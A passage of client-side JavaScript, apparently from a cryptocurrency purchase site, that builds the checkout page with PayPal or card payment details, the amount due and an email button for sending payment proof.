            </div>`; 
    } 
    else if (method === 'PayPal') { 
        let paypalEmail = (globalSettings && globalSettings.adminPaypalEmail) ? globalSettings.adminPaypalEmail : "<span style='color: #f6465d;'>Admin has not set PayPal email yet.</span>"; 
        detailsHtml = `
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 8px;">Step 2: Send Fiat to this PayPal Email</p>
                <p style="color: #fff; font-size: 14px; font-family: monospace; margin: 0;">${paypalEmail}</p>
            </div>`; 
    } 
    else if (method === 'Credit Card') { 
        let cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : ""; 
        if (cardLink) { 
            detailsHtml = `
                <div style="background: #0f0f15; padding: 20px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: center;">
                    <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 15px;">Step 2: Pay securely via Card</p>
                    <a href="${cardLink}" target="_blank" style="background: #00d4aa; color: #000; padding: 14px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Click Here to Pay</a>
                </div>`; 
        } else { 
            detailsHtml = `<div class="warning-banner" style="text-align:left;"><p>Card payment link is not set. Please contact support.</p></div>`; 
        } 
    }

    const content = `
        <div style="text-align: center;">
            <div style="margin-bottom: 25px;">
                <div style="width: 60px; height: 60px; background: rgba(0,212,170,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                </div>
                <h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3>
                <p style="color: #888; font-size: 14px;">You are purchasing <strong style="color:#fff;">${cryptoAmount} ${symbol}</strong></p>
            </div>

            <!-- THE BIG AMOUNT BOX -->
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px; text-align: center;">
                <p style="color: #888; font-size: 12px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px;">Step 1: Amount to Pay</p>
                <p style="color: #00d4aa; font-size: 26px; font-weight: 800; margin: 0;">${fiatAmount}</p>
            </div>

            ${detailsHtml}

            <div style="background: #1a1a2a; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; text-align: center;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 10px;">Step 3: Send Payment Proof</p>
                <p style="color: #fff; font-size: 14px; margin-bottom: 15px; line-height: 1.5;">After making the payment, click below to open your email app and send us your receipt.</p>
                <a href="${mailtoLink}" style="background: #00d4aa; color: #000; padding: 14px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Open Email App</a>
            </div>

            <button onclick="showView('dashboardView')" style="background: #2a2a3a; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Back to Dashboard</button>
        </div>`;
    
    createPageView('buyCheckoutPage', 'Complete Payment', content); 
    showView('buyCheckoutPage');
};
